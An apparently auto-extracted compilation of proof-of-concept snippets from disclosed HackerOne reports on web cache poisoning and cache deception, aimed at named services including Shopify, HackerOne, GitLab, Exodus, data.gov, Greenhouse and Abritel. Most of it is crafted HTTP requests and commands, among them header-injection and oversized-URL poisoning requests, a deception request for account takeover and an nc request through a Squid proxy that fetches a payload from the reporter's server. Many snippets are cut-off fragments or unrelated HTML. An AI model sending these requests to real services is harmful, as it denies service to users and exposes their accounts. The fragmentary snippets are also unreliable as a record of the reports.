# Web cache poisoning / deception — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #1695604 DoS Vulnerability via Cache Poisoning on cdn.shopify.com and shopify-assets.shopifycdn.com — shopify — $3,800 — Cache Poisoning
Source: `hackerone/reports/2025/1695604.md` (https://hackerone.com/reports/1695604)

```
GET /static/javascripts/vendor/bugsnag.v7.4.0.min.js HTTP/1.1
Host: cdn.shopify.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

```
GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1
Host: cdn.shopify.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

## #1096609 https://themes.shopify.com::: Host header web cache poisoning lead to DoS — shopify — $2,900 — Uncontrolled Resource Consumption
Source: `hackerone/reports/2021/1096609.md` (https://hackerone.com/reports/1096609)

```
                                 Dload  Upload   Total   Spent    Left  Speed
```

```
        <li><div class="popover-wrapper js-popover-dropdown popover-wrapper--dropdown" data-position="bottom" data-align="left"><button type="button" class="popover__trigger marketing-nav__item marketing-nav__item--primary" itemprop="name">Collections<svg class="icon marketing-nav__arrow" aria-hidden="true" focusable="false"> <use xlink:href="#modules-caret-down" /> </svg></button><div class="popover"><div class="popover__content"><ul class="popover__list"><li><a href="/collections/trending-themes" class="marketing-nav__item marketing-nav__item--child" itemprop="name" data-ga-event="Main Nav" data-ga-action="Clicked" data-ga-label="trending-themes">Trending this week </a></li><li><a href="/collections/product-recommendations" class="marketing-nav__item marketing-nav__item--child" itemprop="name" data-ga-e
```

## #409370 Denial of service via cache poisoning — security — $2,500 — Uncontrolled Resource Consumption
Source: `hackerone/reports/2018/409370.md` (https://hackerone.com/reports/409370)

```
Then try to load https://www.hackerone.com/index.php?dontpoisoneveryone=1 in your browser.

This attack can also be done using the X-Forwarded-Host header:
```

## #977851 Cache poisoning via X-Forwarded-Host in www.shopify.com/partners/blog — shopify — $1,000 — Improper Neutralization of HTTP Headers for Scripting Syntax
Source: `hackerone/reports/2020/977851.md` (https://hackerone.com/reports/977851)

```
{F981839}

now remove 
```

```
{F981841}

i've logged to my VPS to verify this bug and downloaded poisoned page (https://www.shopify.com/partners/blog/7-web-design-and-development-awards-you-should-enter) , it's contains links to collabolator:

{F981844}

{F981845}

Looks like there is no URL keys so i stopped testing cause i'm breaking site functionally, but it was be worth to check if we can poison  
```

```
## Impact

poisoning links, eg. FB share button:
```

## #1181946 Static files on HackerOne.com can be made inaccessible through Cache Poisoning attack — security — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2021/1181946.md` (https://hackerone.com/reports/1181946)

```
GET /assets/static/js/8.9572d249.chunk.js?hackerone=poc HTTP/2
Host: hackerone.com
x-forwarded-scheme: http
```

```
GET /assets/static/js/8.9572d249.chunk.js?hackerone=poc HTTP/2
Host: hackerone.com
x-forwarded-scheme: http

'''
```

## #1698316 Cache Deception Allows Account Takeover — expediagroup_bbp — - — Use of Cache Containing Sensitive Information
Source: `hackerone/reports/2023/1698316.md` (https://hackerone.com/reports/1698316)

```
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
```

```
{F1923081}


2-> use the token 
```

```
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
'''
```

## #1173153 Cache Poisoning DoS on downloads.exodus.com — exodus — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2021/1173153.md` (https://hackerone.com/reports/1173153)

```
https://downloads.exodus.com/releases/exodus-linux-x64-21.4.9.zip
https://downloads.exodus.com/releases/hashes-exodus-21.2.12.txt
https://downloads.exodus.com/releases/exodus-macos-21.3.29.dmg
```

```
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com
Authorization: SharedKeyLite myaccount:ctzMq410TV3wS7upTBcunJTDLEJwMAZuFPfr0mrrA08=  
```

```
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com
Authorization: SharedKeyLite myaccount:ctzMq410TV3wS7upTBcunJTDLEJwMAZuFPfr0mrrA08=  

'''
```

## #1160407 Cache poisoning Denial of Service affecting assets.gitlab-static.net — gitlab — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2021/1160407.md` (https://hackerone.com/reports/1160407)

```
GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.chunk.js HTTP/1.1
Host: assets.gitlab-static.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Connection: close
```

```
Age: 498
X-Served-By: cache-dca17752-DCA, cache-osl6520-OSL
X-Cache: HIT, HIT
X-Cache-Hits: 1, 1
```

```
GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.chunk.js?cb=youstin-xyz HTTP/1.1
Host: assets.gitlab-static.net
x-http-method-override: HEAD
```

## #1976449 DOS via cache poisoning on [developer.mozilla.org] — mozilla — - — Cache Poisoning
Source: `hackerone/reports/2023/1976449.md` (https://hackerone.com/reports/1976449)

```
No information about the caching period is available in the response, but it is anyway possible to reinterpret the manipulation indefinitely.
For obvious reasons I performed my tests using a cache-buster - adding a URL parameter as we will see in the POC - so as not to affect the user experience.

## Steps To Reproduce:

  1. Pass your HTTP requests through your preferred proxy
  2. Go to : https://developer.mozilla.org then - in your proxy - send the request to your repeater
  3. Add the parameter of your choice to the URL, it will serve as a cache-buster and will not "poison" the site visited by users. In other words, the DOS will only be effective on the URL containing your parameter, you probably know this but let me clarify: this is very important in order not to damage the services.
  4. Add the following header :
```

```
The request ready to send (
```

## #1183263 Web Cache Poisoning on  █████  — deptofdefense — - — Violation of Secure Design Principles
Source: `hackerone/reports/2021/1183263.md` (https://hackerone.com/reports/1183263)

```
GET /yeettest?yeettest=1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Host: www.█████
Connection: Keep-alive
yeetheadertest1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```
GET /yeettest?yeettest=1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Host: www.████████
Connection: Keep-alive
```

```
GET /yeettest?yeettest=1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Host: www.█████
Connection: Keep-alive
yeetheadertest1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

## #334709 Cache poisoning using NULL bytes and long URLs — greenhouse — - — Improper Null Termination
Source: `hackerone/reports/2018/334709.md` (https://hackerone.com/reports/334709)

```
Grnhse.Settings = {
  targetDomain:   'https://boards.greenhouse.io',
  scrollOnLoad:   true,
  autoLoad:       true,
  boardURI:       'https://boards.greenhouse.io/embed/job_board?for=surveymonkey%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
```

```
https://boards.greenhouse.io/embed/job_app?for=surveymonkey%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%
```

## #1010858 Web cache poisoning at www.acronis.com — acronis — - — Violation of Secure Design Principles
Source: `hackerone/reports/2021/1010858.md` (https://hackerone.com/reports/1010858)

```
GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
x-forwarded-port: zwrtxqvas9lm4kzkia
Origin: https://yig1bt7ai4.com
```

```
GET /zh-cn/careers/ HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
```

```
GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
Host: www.acronis.com
Connection: close
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Accept-Encoding: gzip, deflate, yig1bt7ai4
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
x-forwarded-port: zwrtxqvas9lm4kzkia
Origin: https://yig1bt7ai4.com
'''

2. Remove the parameters, x-forwarded-port, and origin in the request header. Then send the request, the cache has been polluted (due to the cache hit, it may take several more requests).  
```

## #728664 Cache poisoning DoS to various TTS assets — gsa_bbp — - — Violation of Secure Design Principles
Source: `hackerone/reports/2020/728664.md` (https://hackerone.com/reports/728664)

```
X-CF-APP-INSTANCE
```

```
X-CF-APP-INSTANCE: xxx:1
```

```
analytics.usa.gov
federation.data.gov
18f.gsa.gov
code.gov
```

## #429747 https://help.nextcloud.com::: Web cache poisoning attack — nextcloud — - — None
Source: `hackerone/reports/2020/429747.md` (https://hackerone.com/reports/429747)

```
    In the 1st terminal, run command likes this: 
```

```
    In the 2nd terminal, run command below for confirmation this attack is successful: 
```

## #326639 DoS through cache poisoning using invalid HTTP parameters — greenhouse — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2018/326639.md` (https://hackerone.com/reports/326639)

```
https://boards.greenhouse.io/embed/job_board/js?for[]=twitter&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=
```

```
Grnhse.Settings = {
  targetDomain:   'https://boards.greenhouse.io',
  scrollOnLoad:   true,
  autoLoad:       true,
  boardURI:       'https://boards.greenhouse.io/embed/job_board?for%5B%5D=twitter&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=',
  applicationURI: 'https://boards.greenhouse.io/embed/job_app?for%5B%5D=twitter&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=&amp;for%5B%5D=',
  baseURI:        '',
  iFrameWidth:    650
};
```

## #350847 Bypass of request line length limit to DoS via cache poisoning — greenhouse — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2018/350847.md` (https://hackerone.com/reports/350847)

```
#!/bin/sh

REPEAT=992
ID=623145
curl --http1.1 -s "https://boards.greenhouse.io/embed/job_board/js?for=a%00`python -c 'print(\"♥\" * '$REPEAT')'`$ID" -v
```

```
https://boards.greenhouse.io/embed/job_board?for=a%00%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%A5%E2%99%
```

## #3483902 PROTOCOL-LEVEL: Persistent UDP Amplification and Cache Poisoning via Alt-Svc Logic Flaw — curl — - — Business Logic Errors
Source: `hackerone/reports/2026/3483902.md` (https://hackerone.com/reports/3483902)

```
    `Alt-Svc: h3="<VICTIM_IP>:12345", h2=":443"; ma=2592000; persist=1`
```

```
    -   *Logic Flaw*: `curl` correctly parses `persist=1` for `h2`, but **incorrectly applies it** to `h3` as well due to scope leakage in `lib/altsvc.c`.
```

```
    -   Inspect `cache.txt`. You will see the `h3` entry for `<VICTIM_IP>` has the persistence flag set and a 30-day expiry.
```

## #1346618 Web Cache Poisoning leading to DoS — gsa_vdp — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2021/1346618.md` (https://hackerone.com/reports/1346618)

```
curl https://acquisition-uat.gsa.gov/\?letme\=4447 -H "Host: acquisition-uat.gsa.gov:8888"
```

## #921704 Denial-of- service By Cache Poisoning The Cross-Origin Resource Sharing Misconfiguration Allow Origin Header — automattic — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2020/921704.md` (https://hackerone.com/reports/921704)

```
fetch('https://en.instagram-brand.com/wp-json/').then(res => res.json()).then(json => console.log(json))
```

## #824753 Cache Poisoning — ibb — - — Improper Handling of URL Encoding (Hex Encoding)
Source: `hackerone/reports/2021/824753.md` (https://hackerone.com/reports/824753)

```
ftp_server.py 8080 8081
```

```
echo -e "GET ftp://hackerone.com%2f%3f@192.168.122.1:8080/payload HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128
nc: using stream socket
HTTP/1.1 200 Gatewaying
Server: squid/4.9
Mime-Version: 1.0
Date: Thu, 19 Mar 2020 15:57:04 GMT
Content-Type: text/plain
Last-Modified: Wed, 27 Mar 2019 19:14:54 GMT
Age: 79
X-Cache: HIT from g64
Transfer-Encoding: chunked
Via: 1.1 g64 (squid/4.9)
Connection: keep-alive

23
Hello! This is from my ftp server.

0
```

```
<- 150 Here comes data
Passive Connection from: ('192.168.122.97', 51647)
<- Hello! This is from my ftp server.
<- 226 Data sent
-> QUIT
```

## #942629 Denial of service via cache poisoning on https://www.data.gov/ — gsa_bbp — - — None
Source: `hackerone/reports/2021/942629.md` (https://hackerone.com/reports/942629)

```
GET /?xyzxyz=1 HTTP/1.1
Host: www.data.gov
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
h0st: wrtqvavjigwdvoqk
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

```
GET /?xyzxyz=1 HTTP/1.1
Host: www.data.gov
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
h0st: wrtqvavjigwdvoqk
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

'''
```

## #1581454 2 Cache Poisoning Attack Methods Affect Core Functionality www.exodus.com — exodus — - — None
